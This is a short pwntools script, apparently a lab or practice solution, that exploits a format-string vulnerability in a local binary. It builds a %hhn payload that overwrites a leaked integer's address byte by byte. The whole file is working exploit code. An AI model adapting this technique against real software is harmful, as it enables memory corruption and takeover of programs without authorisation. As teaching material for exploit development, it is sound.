#!/usr/bin/python3

## Use hhn to write into each address of the 4-byte integer
## + Simple
## - Large payload [59]

from pwn import *

p = process('./setValueBig')

p.recvuntil("at address ")
val = int(p.recvline(keepends=False), 16)
log.info(f"Got address &someValue = {hex(val)}")

payload = b''
payload += p32(val)
payload += p32(val + 1)
payload += p32(val + 2)
payload += p32(val + 3)

# Write the first byte (0xde == 222) 
payload += f"%{222 - 16}c".encode()
payload += b"%7$hhn"

# Now write 0xad == 173
payload += f"%{(173 - 222) % 256}c".encode()
payload += b"%6$hhn"

# Now write 0xde == 222
payload += f"%{222 - 173}c".encode()
payload += b"%5$hhn"

# Now write 0xad === 173
payload += f"%{(173 - 222) % 256}c".encode()
payload += b"%4$hhn"

log.info(f"PAYLOAD LENGTH = {len(payload)}")

# 0xde = 222
# 0xad = 173

p.sendline(payload)
p.interactive()